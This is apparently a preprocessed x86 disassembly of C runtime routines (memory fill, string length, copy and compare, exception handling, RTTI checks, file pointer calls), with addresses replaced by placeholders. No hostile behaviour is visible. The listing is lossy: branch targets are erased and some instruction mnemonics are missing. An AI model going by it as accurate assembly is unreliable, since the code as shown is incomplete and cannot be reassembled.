test edx 0xfffffffc
je r-xdata
and edx 0x3
je r-xdata
mov [ edi ] ax
lea ecx [ edi + edx - 0x4 ]
mov [ edi + 0x2 ] ax
mov eax [ edi ]
shr edx 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop ebp
retn
mov [ edi ] al
dec dl
je r-xdata
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
pop edi
pop ebp
retn
mov [ edi ] eax
mov [ edi + 0x4 ] eax
dec edx
je r-xdata
mov [ edi + edx - 0x1 ] ax
mov [ ecx ] eax
mov [ ecx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
pop edi
pop ebp
retn
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] eax
dec edx
je r-xdata
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] eax
dec edx
je r-xdata
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
dec edx
je r-xdata
mov [ edi + 0x20 ] eax
mov [ edi + 0x24 ] eax
dec edx
je r-xdata
mov [ edi + 0x28 ] eax
mov [ edi + 0x2c ] eax
lea edi [ edi + 0x30 ]
dec edx
jne r-xdata
sub_44f138
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx 0xffffffff
xor al al
cld
[ edi ]
lea esi [ edi - 0x1 ]
mov edi [ ebp + 0xc ]
mov ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
xchg edi esi
mov edx ecx
shr ecx 0x1
shr ecx 0x1
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn
sub_44f174
mov eax [ esp + 0x4 ]
test al 0x3
jne r-xdata
add eax 0x4
test [ eax - 0x4 ] 0xff
je r-xdata
mov edx [ eax ]
add eax 0x4
mov ecx edx
sub edx 0x1010101
and edx 0x80808080
je r-xdata
dec eax
test [ eax - 0x3 ] 0xff
je r-xdata
not ecx
and edx ecx
je r-xdata
dec eax
test [ eax - 0x2 ] 0xff
je r-xdata
test dl dl
jne r-xdata
dec eax
dec eax
and al 0xfc
jmp r-xdata
test dh dh
jne r-xdata
test edx 0xff0000
jne r-xdata
jmp r-xdata
mov ecx [ esp + 0x4 ]
dec eax
sub eax ecx
retn
sub_44f1d0
push ebp
mov ebp esp
push edi
push ebx
mov edi [ ebp + 0x8 ]
mov ecx 0xffffffff
xor al al
cld
[ edi ]
mov ecx [ ebp + 0x10 ]
lea ebx [ edi - 0x1 ]
and ecx 0x3
mov edx [ ebp + 0xc ]
jecxz r-xdata
mov ecx [ ebp + 0x10 ]
shr ecx 0x2
jecxz r-xdata
mov al [ edx ]
mov [ ebx ] al
test al al
je r-xdata
mov [ ebx ] 0x0
mov al [ edx ]
mov [ ebx ] al
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop edi
pop ebp
retn
inc edx
inc ebx
dec ecx
jne r-xdata
mov al [ edx + 0x1 ]
mov [ ebx + 0x1 ] al
test al al
je r-xdata
mov al [ edx + 0x2 ]
mov [ ebx + 0x2 ] al
test al al
je r-xdata
mov al [ edx + 0x3 ]
add edx 0x4
mov [ ebx + 0x3 ] al
add ebx 0x4
test al al
je r-xdata
dec ecx
jne r-xdata
sub_44f240
push ebp
mov ebp esp
push esi
push edi
cld
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
xor eax eax
jmp r-xdata
lodsb [ esi ]
scasb [ edi ]
jne r-xdata
pop edi
pop esi
pop ebp
retn
sbb eax eax
or eax 0x1
test al al
jne r-xdata
dec ecx
js r-xdata
sub_44f268
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov al [ ecx ]
mov dl [ esi ]
cmp dl al
jne r-xdata
mov al [ ecx ]
mov dl [ esi ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov al [ ecx + 0x1 ]
mov dl [ esi + 0x1 ]
cmp dl al
jne r-xdata
xor ecx ecx
mov cl al
xor eax eax
mov al dl
sub ecx eax
mov eax ecx
inc ecx
inc esi
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov al [ ecx + 0x2 ]
mov dl [ esi + 0x2 ]
cmp dl al
jne r-xdata
mov al [ ecx + 0x3 ]
mov dl [ esi + 0x3 ]
cmp dl al
jne r-xdata
sub edi 0x4
add ecx 0x4
add esi 0x4
cmp edi 0x4
jge r-xdata
cmp edi 0x4
jl r-xdata
sub_44f2d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_44f174
pop ecx
mov esi eax
inc esi
push esi
call sub_44ebd4
pop ecx
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
push esi
push edi
push ebx
call sub_44f024
add esp 0xc
sub_44f308
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push edi
call sub_44f174
pop ecx
mov ebx eax
cmp ebx [ ebp + 0x10 ]
jbe r-xdata
push ebx
push edi
push esi
call sub_44f024
add esp 0xc
mov edx [ ebp + 0x10 ]
sub edx ebx
add ebx esi
push edx
push 0x0
push ebx
call sub_44f094
add esp 0xc
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call sub_44f024
add esp 0xc
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn
sub_44f370
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_44f358
pop ecx
mov ebx eax
xor ecx ecx
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax esi
cmp ebx ecx
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + ebx * 2 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
pop ebp
retn
mov si [ eax ]
mov [ edx ] si
inc ecx
add edx 0x2
add eax 0x2
cmp ebx ecx
ja r-xdata
sub_44f3b0
push ebx
mov ebx ebp
add ebx [ eax + 0x4 ]
mov [ ebx + 0x8 ] eax
lea eax [ esp + 0x8 ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x4 ] r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x12 ] 0x0
mov [ ebx + 0x1c ] 0x0
mov eax [ fs : 0x0 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop ebx
retn
sub_44f420
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test [ edi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x1
jne r-xdata
push 0x13b
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ ebp + 0x8 ]
test [ edx + 0xc ] 0x4
jne r-xdata
push 0x13c
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov ecx [ ebp + 0x8 ]
movzx ebx [ ecx + 0x12 ]
add ebx [ ebp + 0x8 ]
push 0x13e
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ ebp + 0x8 ]
movzx ebx [ edx + 0x10 ]
add ebx [ ebp + 0x8 ]
test [ ebx + 0x8 ] 0x8
jne r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
add ebx 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
and eax 0x3
cmp eax 0x3
je r-xdata
mov esi [ ebx ]
test esi esi
je r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
and eax 0x3
cmp eax 0x3
je r-xdata
mov [ ebp - 0x8 ] edx
push esi
push edi
call sub_44f90c
add esp 0x8
test eax eax
je r-xdata
mov edx 0x1
mov [ ebp - 0x4 ] edx
push esi
push edi
call sub_44f90c
add esp 0x8
test eax eax
je r-xdata
mov edx 0x1
test [ esi + 0xc ] 0x4
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test [ esi + 0xc ] 0x4
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
add ebx 0xc
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_44f420
add esp 0x10
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_44f420
add esp 0x10
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov esi [ ebx ]
test esi esi
je r-xdata
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax 0x1
jmp r-xdata
sub_44f577
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov eax rw-data
call sub_44f3b0
xor esi esi
inc esi
cmp esi 0x100
jl r-xdata
test eax eax
je r-xdata
mov eax [ esi * 4 + rw-data ]
test eax eax
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ eax + 0xc ]
test eax eax
je r-xdata
mov eax ebx
test eax eax
jne r-xdata
push 0x3
push eax
mov eax [ eax ]
call [ eax ]
add esp 0x8
sub_44f5ca
push ebp
mov ebp esp
add esp 0xffffffe8
xor eax eax
xor edx edx
xor ecx ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x34f
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov eax [ ebp + 0xc ]
test [ eax + 0x4 ] 0x1
jne r-xdata
push 0x350
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ ebp + 0x14 ]
test [ edx + 0x4 ] 0x1
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
mov ecx [ ebp + 0x1c ]
test [ ecx + 0x4 ] 0x1
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x1c ]
call sub_44f90c
add esp 0x8
test eax eax
je r-xdata
push 0x351
push rw-data
push rw-data
call sub_454374
add esp 0xc
push 0x35b
push rw-data
push rw-data
call sub_454374
add esp 0xc
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_44f90c
add esp 0x8
test eax eax
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x1c ]
call sub_44f90c
add esp 0x8
test eax eax
je r-xdata
push 0x355
push rw-data
push rw-data
call sub_454374
add esp 0xc
xor edx edx
mov [ ebp - 0x4 ] edx
mov ecx [ ebp + 0xc ]
movzx ebx [ ecx + 0x12 ]
add ebx [ ebp + 0xc ]
xor eax eax
jmp r-xdata
mov edx [ ebp + 0xc ]
test [ edx + 0xc ] 0x4
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test [ ebx + 0x8 ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x20 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
cmp [ ebp - 0x10 ] 0x1
je r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
movzx ebx [ eax + 0x10 ]
add ebx [ ebp + 0xc ]
jmp r-xdata
add ebx 0xc
jmp r-xdata
cmp [ ebp + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi [ ebx ]
test edi edi
je r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
and eax 0x3
cmp eax 0x3
je r-xdata
mov [ ebp - 0x14 ] edx
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x28 ]
add esi [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
test [ ebx + 0x8 ] 0x4
je r-xdata
mov edx 0x1
push edi
push [ ebp + 0x14 ]
call sub_44f90c
add esp 0x8
test eax eax
jne r-xdata
mov esi [ esi ]
mov [ ebp - 0x18 ] edi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ edi + 0xc ] 0x4
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_44f5ca
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax esi
jmp r-xdata
mov esi eax
mov eax [ ebp + 0x20 ]
mov edx [ eax ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
inc [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ecx
cmp esi [ ebp - 0xc ]
jne r-xdata
push 0x0
push 0x0
push [ ebp + 0x20 ]
push 0x0
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push esi
call sub_44f5ca
add esp 0x24
test eax eax
je r-xdata
push 0x3d0
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ ebp - 0x14 ]
or [ ebp - 0x8 ] edx
jmp r-xdata
sub_44f831
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
cmp [ edi ] 0x0
jne r-xdata
mov ebx [ esi ]
test ebx ebx
jne r-xdata
push 0x515
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ edi ]
add edx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x10 ]
push ebx
call sub_44f90c
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test [ ebx + 0x4 ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax 0x1
mov [ edi ] edx
jmp r-xdata
add esi 0xc
jmp r-xdata
movzx eax [ ebx + 0x10 ]
add eax ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0x10 ]
push 0x0
push eax
call sub_44f831
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x1
mov [ edi ] ecx
jmp r-xdata
sub_44f8d4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
cmp [ ebx + 0x6 ] 0x0
jne r-xdata
mov eax rw-data
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x6 ]
add eax ebx
pop ebx
pop ebp
retn
push 0x22
push rw-data
push rw-data
call sub_454374
add esp 0xc
sub_44f90c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
push 0x105
push rw-data
push rw-data
call sub_454374
add esp 0xc
cmp esi ebx
jne r-xdata
push 0x106
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov dx [ ebx + 0x4 ]
cmp dx [ esi + 0x4 ]
jne r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebx ]
cmp ecx [ esi ]
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov dx [ ebx + 0x4 ]
or dx [ esi + 0x4 ]
test dl 0x80
je r-xdata
movzx edi [ ebx + 0x6 ]
add edi ebx
cmp [ ebx + 0x6 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
movzx ebx [ esi + 0x6 ]
add ebx esi
cmp [ esi + 0x6 ] 0x0
jne r-xdata
push 0x11e
push rw-data
push rw-data
call sub_454374
add esp 0xc
movsx eax [ edi ]
movsx edx [ ebx ]
inc ebx
inc edi
cmp edx eax
je r-xdata
push 0x11f
push rw-data
push rw-data
call sub_454374
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
sub_44f9e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
movzx edi [ ebx + 0x4 ]
movzx edx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x4 ]
and ecx edi
test cl 0x10
je r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
and edx edi
test dh 0x4
je r-xdata
and edi 0x300
and [ ebp - 0x4 ] 0x300
cmp edi [ ebp - 0x4 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push esi
push ebx
call sub_44f90c
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
cmp ecx [ esi + 0xc ]
je r-xdata
mov eax 0x1
mov ebx [ ebx + 0x8 ]
mov esi [ esi + 0x8 ]
jmp r-xdata
test eax eax
jne r-xdata
test edi 0x2
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x1
mov ebx [ ebx + 0x8 ]
mov esi [ esi + 0x8 ]
jmp r-xdata
test eax eax
jne r-xdata
cmp esi ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax edi
mov edx [ ebp - 0x4 ]
and edx 0x300
and eax 0x300
cmp eax edx
je r-xdata
xor eax eax
test [ ebp - 0x4 ] 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0xc ]
or eax [ esi + 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
and eax 0x300
not eax
and eax edi
test ah 0x3
je r-xdata
test [ ebx + 0xc ] 0x4
je r-xdata
or edi 0x300
or [ ebp - 0x4 ] 0x300
cmp edi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
push [ ebp + 0x14 ]
push esi
push ebx
call sub_44f420
add esp 0x10
jmp r-xdata
sub_44faf8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov [ eax ] rw-data
test [ ebp + 0xc ] 0x1
je r-xdata
push eax
call sub_44e6dc
pop ecx
sub_44fb18
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov al 0x1
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x4 ]
test [ edx + 0x4 ] 0x80
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
call sub_44fc9c
pop ecx
push eax
push esi
call sub_44fc9c
pop ecx
mov edx eax
pop eax
mov ecx [ esi + 0x4 ]
test [ ecx + 0x4 ] 0x80
je r-xdata
xor eax eax
jmp r-xdata
sete al
and eax 0x1
test cl cl
je r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
add eax 0x2
add edx 0x2
test cl cl
jne r-xdata
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
sub_44fb8c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
push r-xdata
call sub_4564e0
add esp 0x24
mov edi ebx
test [ ebx + 0xc ] 0x80
je r-xdata
test ebx ebx
jne r-xdata
cmp edi [ ebx + 0x4 ]
jne r-xdata
sub esi [ esi - 0x4 ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x14
call sub_44e710
pop ecx
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
cmp esi [ ebx + 0x8 ]
je r-xdata
mov edi [ esi - 0xc ]
jmp r-xdata
push 0x29e
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov eax esi
add eax edi
sar eax 0x4
and eax 0xff
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov ebx [ edx * 4 + rw-data ]
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx * 4 + rw-data ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x8 ]
mov [ eax ] rw-data
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0x8 ]
mov [ eax ] rw-data
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ edx + 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0xc ] edx
mov ecx [ ebp - 0x8 ]
xor eax eax
mov [ ecx + 0x10 ] eax
mov ebx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax * 4 + rw-data ] ebx
sub_44fc9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
push [ eax + 0x4 ]
call sub_44f8d4
pop ecx
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebx + 0x8 ]
mov edi [ edx - 0x2c ]
movzx esi [ edi ]
lea eax [ esi + 0x1 ]
push eax
call sub_44e8b0
pop ecx
mov [ ebx + 0x10 ] eax
push esi
inc edi
push edi
push [ ebx + 0x10 ]
call sub_44f024
add esp 0xc
mov eax [ ebx + 0x10 ]
mov [ eax + esi ] 0x0
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov eax rw-data
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_44fd04
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
movzx eax [ ebx + 0x10 ]
add eax ebx
lea edx [ ebp + 0x8 ]
push edx
push esi
push 0x0
push eax
call sub_44f831
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
movzx eax [ ebx + 0x12 ]
add eax ebx
lea edx [ ebp + 0x8 ]
push edx
push esi
push 0x1
push eax
call sub_44f831
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov edx rw-data
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
xor eax eax
push 0x57e
push rw-data
push rw-data
call sub_454374
add esp 0xc
sub_44fe74
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
call sub_44f3b0
mov edx sub_44fe74
cmp edx [ rw-data ]
je r-xdata
call sub_45465c
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0x8
call [ rw-data ]
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
sub_44ff18
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
call sub_44f3b0
call sub_401140
and [ eax + 0x14 ] 0xfffffffd
mov edx [ rw-data ]
cmp [ edx ] 0x2
jne r-xdata
call sub_450440
mov eax [ rw-data ]
mov [ ebp - 0x14 ] 0x8
call eax
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
push [ rw-data ]
push 0x1
push 0x4
call sub_4560a5
add esp 0xc
call sub_45465c
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ff8c
call sub_401140
and [ eax + 0x14 ] 0xfffffffd
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
call eax
call sub_45465c
retn
push [ rw-data ]
push 0x1
push 0x5
call sub_4560a5
add esp 0xc
sub_44ffc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
setne al
and eax 0x1
test ebx ebx
jne r-xdata
push 0x9c
push ebx
call sub_401140
add eax 0x10
push eax
call sub_44f024
add esp 0xc
call sub_44fe4c
pop ebx
pop ecx
pop ecx
pop ebp
retn
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x8 ]
push edx
call sub_450010
pop ecx
mov ebx [ ebp - 0x4 ]
sub_450044
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx ] 0xeedfae6
jne r-xdata
mov eax [ ebx ]
cmp eax 0xeefface
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
mov edx ebx
call sub_45020e
call sub_44ff18
cmp eax 0xeedface
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx ] 0xc00000fd
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
push edx
push esi
push edi
push ebx
call [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push rw-data
call sub_454630
pop ecx
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
push edx
push esi
push edi
push ebx
call [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] esi
lea edx [ ebp - 0x8 ]
push edx
call UnhandledExceptionFilter
mov edx [ rw-data ]
mov eax [ edx ]
cmp eax 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp eax 0xeedface
jb r-xdata
cmp eax 0x2
jne r-xdata
push esi
push ebx
push edi
push 0x3
push 0x2
call sub_4560a5
add esp 0x14
cmp eax 0xeefface
jbe r-xdata
sub_4501d5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ fs : 0x0 ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : 0x0 ] eax
pop ebp
retn
cmp [ ecx ] eax
je r-xdata
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ecx ]
jmp r-xdata
sub_45022c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jb r-xdata
mov edx [ ebx * 4 + rw-data ]
push edx
call GetFileType
cmp eax 0x2
sete al
and eax 0x1
pop ebx
pop ebp
retn
xor eax eax
pop ebx
pop ebp
retn
sub_450274
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jb r-xdata
mov eax [ ebp + 0x10 ]
sub eax 0x1
jb r-xdata
push 0x6
call sub_450a78
pop ecx
jmp r-xdata
xor edi edi
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
call sub_4506c4
pop ecx
and [ ebx * 4 + rw-data ] 0xfffffdff
push edi
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebx * 4 + rw-data ]
push edx
call SetFilePointer
mov esi eax
inc eax
jne r-xdata
mov edi 0x1
jmp r-xdata
dec eax
je r-xdata
push ebx
call sub_450758
pop ecx
mov eax esi
call sub_450ae4
mov edi 0x2
jmp r-xdata
jmp r-xdata
push 0x1
call sub_450a78
pop ecx
jmp r-xdata
sub_4502f8
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
jb r-xdata
mov edx [ ebp + 0x10 ]
inc edx
cmp edx 0x2
jae r-xdata
push 0xfffffffa
call sub_450a78
pop ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4506c4
pop ecx
mov ecx [ ebp + 0x8 ]
test [ ecx * 4 + rw-data ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
test [ edx * 4 + rw-data ] 0x40
jne r-xdata
push 0x2
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_450274
add esp 0xc
mov esi edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor edx edx
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
